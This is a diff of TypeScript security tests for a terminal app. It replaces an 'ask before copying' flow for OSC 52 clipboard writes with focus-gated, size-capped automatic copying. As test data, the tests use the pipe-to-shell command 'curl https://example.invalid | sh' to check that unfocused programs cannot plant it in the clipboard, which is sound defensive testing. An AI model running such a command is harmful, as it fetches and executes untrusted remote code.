@@ -13,21 +13,14 @@ import {
   nextAudioConsent,
   registerRecorderContents
 } from '../../src/main/captureConsent'
-import {
-  PROGRAM_COPY_MAX_CHARS,
-  PROGRAM_COPY_PENDING_MS,
-  ProgramCopies,
-  normalizeTerminalClipboardMode,
-  programCopyDecision,
-  programCopyPreview
-} from '../../src/main/terminalClipboard'
+import { PROGRAM_COPY_MAX_CHARS, programCopyText } from '../../src/main/terminalClipboard'
 import { PAGE_CLIPBOARD_GRANT_MS, PageClipboardGrant, installPermissionPolicy, type PermissionDetails, type PermissionSessionLike } from '../../src/main/webPolicy'
 import { parseOsc52 } from '../../src/renderer/terminal/terminalOsc52'
 
 /**
  * Codex のセキュリティスキャン5回目（security-5）のうち、取り込み・クリップボードの3件の不変条件。
  *   [1] 画面・音声・撮影は main が持つ同意（本物の入力からの1回きりの許可）と、アプリの窓の本体のフレームからの呼び出しだけ
- *   [9] 端末の出力（OSC 52）は、利用者の操作か明示の設定なしにクリップボードを書き換えない
+ *   [9] 端末の出力（OSC 52）は確認なしで写す（製品の判断で帯をやめた）。ただしアプリの窓にフォーカスがあるときだけ・大きさの上限つき・読み出しには答えない
  *   [14] 内蔵ブラウザのページのコピーは、名前だけでは許さない（操作の直後・同じビュー・同じオリジン・1回）
  * 件ごとのふるまいと、「同じ種類のコードを新しく書いたときにも落ちる」ソースの形の両方を見る。
  */
@@ -211,70 +204,44 @@ describe('security-5 [1] capture needs a fresh one-use grant from a native gestu
 
 // ───────────────────────── [9] 端末の OSC 52 ─────────────────────────
 
-describe('security-5 [9] terminal output cannot silently overwrite the clipboard', () => {
-  const base = { mode: 'ask' as const, remote: false, windowFocused: true, terminalFocused: true }
-
-  it('asks by default, even when focused', () => {
-    expect(normalizeTerminalClipboardMode(undefined)).toBe('ask')
-    expect(normalizeTerminalClipboardMode('yes')).toBe('ask')
-    expect(programCopyDecision(base)).toBe('ask')
+describe('security-5 [9] terminal program copies (OSC 52) are copied without a confirmation, within the remaining limits', () => {
+  it('copies right away while the app window has focus', () => {
+    expect(programCopyText('hello 日本語', { windowFocused: true })).toBe('hello 日本語')
+    expect(programCopyText('x'.repeat(PROGRAM_COPY_MAX_CHARS), { windowFocused: true })).toHaveLength(PROGRAM_COPY_MAX_CHARS)
   })
 
-  it('unfocused and SSH writes are never copied without asking, even when allowed', () => {
-    expect(programCopyDecision({ ...base, mode: 'allow' })).toBe('copy')
-    expect(programCopyDecision({ ...base, mode: 'allow', remote: true })).toBe('ask')
-    expect(programCopyDecision({ ...base, mode: 'allow', windowFocused: false })).toBe('ask')
-    expect(programCopyDecision({ ...base, mode: 'allow', terminalFocused: false })).toBe('ask')
-    expect(programCopyDecision({ ...base, mode: 'off' })).toBe('drop')
+  it('a program in the background cannot overwrite the clipboard while the user is in another app', () => {
+    expect(programCopyText('curl https://example.invalid | sh', { windowFocused: false })).toBeNull()
   })
 
-  it('a request in ask mode writes nothing; the text is handed over once and only while fresh', () => {
-    const c = clock()
-    const copies = new ProgramCopies(c.now)
-    const offered = copies.offer('pty-1', 'curl https://example.invalid | sh', 'ask')
-    expect(offered.write).toBeNull()
-    expect(offered.result).toEqual({ kind: 'ask', chars: 33, preview: 'curl https://example.invalid | sh' })
-    expect(copies.take('pty-1')).toBe('curl https://example.invalid | sh')
-    expect(copies.take('pty-1')).toBeNull()
-    copies.offer('pty-1', 'old', 'ask')
-    c.advance(PROGRAM_COPY_PENDING_MS + 1)
-    expect(copies.take('pty-1')).toBeNull()
-    // 新しい求めは古いものを置き換え、閉じたら捨てる
-    copies.offer('pty-1', 'first', 'ask')
-    copies.offer('pty-1', 'second', 'ask')
-    expect(copies.take('pty-1')).toBe('second')
-    copies.offer('pty-1', 'third', 'ask')
-    copies.forget('pty-1')
-    expect(copies.take('pty-1')).toBeNull()
-  })
-
-  it('caps, off and bad input still block; read queries are still ignored', () => {
-    const copies = new ProgramCopies()
-    expect(copies.offer('pty-1', 'x'.repeat(PROGRAM_COPY_MAX_CHARS + 1), 'ask').result).toEqual({ kind: 'blocked' })
-    expect(copies.offer('pty-1', '', 'ask').result).toEqual({ kind: 'blocked' })
-    expect(copies.offer('pty-1', 42, 'ask').result).toEqual({ kind: 'blocked' })
-    expect(copies.offer('pty-1', 'hello', 'drop')).toEqual({ result: { kind: 'blocked' }, write: null })
-    expect(copies.offer('pty-1', 'hello', 'copy')).toEqual({ result: { kind: 'copied', chars: 5 }, write: 'hello' })
+  it('oversized, empty and non-string input is never copied; read queries are still ignored', () => {
+    expect(programCopyText('x'.repeat(PROGRAM_COPY_MAX_CHARS + 1), { windowFocused: true })).toBeNull()
+    expect(programCopyText('', { windowFocused: true })).toBeNull()
+    expect(programCopyText(42, { windowFocused: true })).toBeNull()
+    expect(programCopyText(null, { windowFocused: true })).toBeNull()
     expect(parseOsc52('c;?')).toEqual({ kind: 'query' })
   })
 
-  it('the preview hides control and bidi characters', () => {
-    expect(programCopyPreview('a\u001b[31mb‮c\nd')).toBe('a [31mb c d')
-    expect(programCopyPreview('y'.repeat(200))).toHaveLength(81)
+  it('there is no confirmation bar, pending copy or setting left over', () => {
+    const ipc = read('src/shared/ipc.ts')
+    expect(ipc).not.toMatch(/programCopyAccept|programCopyDismiss|settings:terminalClipboard/)
+    expect(read('src/shared/settingsSchema.ts')).toMatch(/LEGACY_KEYS = \[[^\]]*'terminalClipboard'/)
+    expect(() => read('src/renderer/components/TerminalClipboardBar.tsx')).toThrow()
+    for (const file of walk('src/shared/i18n', /\.ts$/)) expect(read(file), file).not.toMatch(/terminal\.programCopy\./)
   })
 
-  it('the OSC 52 handler goes through the main policy, and the main writes only after a gesture or the explicit setting', () => {
+  it('the OSC 52 handler goes through the main checks, and the main writes only what programCopyText allows', () => {
     const client = read('src/renderer/terminal/terminalClient.ts')
     const handler = client.slice(client.indexOf('registerOscHandler(52'), client.indexOf('this.disposers.push(() => osc52.dispose())'))
     expect(handler).toMatch(/'terminal:programCopy'/)
+    // 流し直しの間の古いコピーは写さない
+    expect(handler).toMatch(/!this\.replaying/)
     expect(handler).not.toMatch(/writeClipboard|clipboard\.write|navigator\.clipboard/)
     const main = read('src/main/index.ts')
-    const accept = main.slice(main.indexOf("'terminal:programCopyAccept'"), main.indexOf("'terminal:programCopyDismiss'"))
-    expect(accept.indexOf("gestures.consume('programCopy')")).toBeGreaterThan(0)
-    expect(accept.indexOf("gestures.consume('programCopy')")).toBeLessThan(accept.indexOf('clipboard.writeText'))
+    const copy = main.slice(main.indexOf("'terminal:programCopy'"), main.indexOf("'terminal:focused'"))
+    expect(copy).toMatch(/programCopyText\(text, \{ windowFocused: !!mainWindow && !mainWindow\.isDestroyed\(\) && mainWindow\.isFocused\(\) \}\)/)
+    expect(copy.indexOf('if (write === null) return false')).toBeLessThan(copy.indexOf('clipboard.writeText(write)'))
     expect(main).toMatch(/'terminal:writeClipboard': \(text\) => \{ if \(typeof text === 'string' && text\.length <= 8 \* 1024 \* 1024 && gestures\.consume\('copy'\)\) clipboard\.writeText\(text\) \}/)
-    // 確かめずに写す設定へ広げるのは、利用者の操作の直後だけ
-    expect(main).toMatch(/next === 'allow' && !gestures\.consume\('choice'\)/)
     // renderer に OS のクリップボードを書く別の道を作らない
     for (const file of walk('src/renderer', /\.tsx?$/)) expect(read(file), file).not.toMatch(/navigator\.clipboard\.write\w*\([^)]*osc/i)
   })
